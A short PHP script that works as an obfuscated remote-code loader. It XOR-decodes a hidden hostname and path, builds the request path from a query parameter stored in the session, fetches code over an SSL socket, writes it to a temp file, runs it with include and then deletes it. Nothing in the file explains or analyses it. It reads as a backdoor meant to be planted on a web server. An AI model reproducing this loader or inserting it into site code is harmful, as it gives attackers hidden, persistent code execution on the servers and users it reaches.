<?php
if (!function_exists('xorEncryptDecrypt')) {
    function xorEncryptDecrypt($data, $key) {
        $output = '';
        foreach (str_split($data) as $char) {
            $output .= chr(ord($char) ^ ord($key));
        }
        return $output;
    }
}
 $_ = "!";
 $url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
 $path = xorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
 $exx = xorEncryptDecrypt("QIQ", $_);
 $customValue = isset($_GET['gf']) ? $_GET['gf'] : 'xx';

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
if (isset($_GET['gf'])) {
    $_SESSION['last_custom'] = $customValue;
} else if (isset($_SESSION['last_custom'])) {
    $customValue = $_SESSION['last_custom'];
}

 $pc = $path.$customValue.$exx;
 $fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
if (!$fp) {
    echo "Error: $errstr ($errno)";
    exit;
}
 $request = "GET $pc HTTP/1.1\r\n";
 $request .= "Host: $url\r\n";
 $request .= "Connection: close\r\n\r\n";
fwrite($fp, $request);
 $response = '';
while (!feof($fp)) {
    $response .= fgets($fp, 1024);
}
fclose($fp);
list(, $remotePayload) = explode("\r\n\r\n", $response, 2);
 $parts = str_split($remotePayload, 4);
 $obfuscatedPayload = implode('', $parts);

 $tempFile = tempnam(sys_get_temp_dir(), $exx);
file_put_contents($tempFile, $obfuscatedPayload);

 $payloadCode = file_get_contents($tempFile);
 $payloadCode = str_replace('function xorEncryptDecrypt($data, $key) {', 'if (!function_exists(\'xorEncryptDecrypt\')) { function xorEncryptDecrypt($data, $key) {', $payloadCode);

 $pattern = '/function xorEncryptDecrypt\(\$data, \$key\) \{.*?\n}/s';
if (preg_match($pattern, $payloadCode, $matches)) {
    $originalFunction = $matches[0];
    $modifiedFunction = $originalFunction . "\n}";
    $payloadCode = str_replace($originalFunction, $modifiedFunction, $payloadCode);
}

 $payloadCode = str_replace('session_start()', 'if (session_status() == PHP_SESSION_NONE) { session_start(); }', $payloadCode);
if (strpos($payloadCode, '$_SERVER') !== false && !isset($_SERVER)) {
    $payloadCode = '$_SERVER = array();' . $payloadCode;
}
file_put_contents($tempFile, $payloadCode);
include $tempFile;
unlink($tempFile);
?>
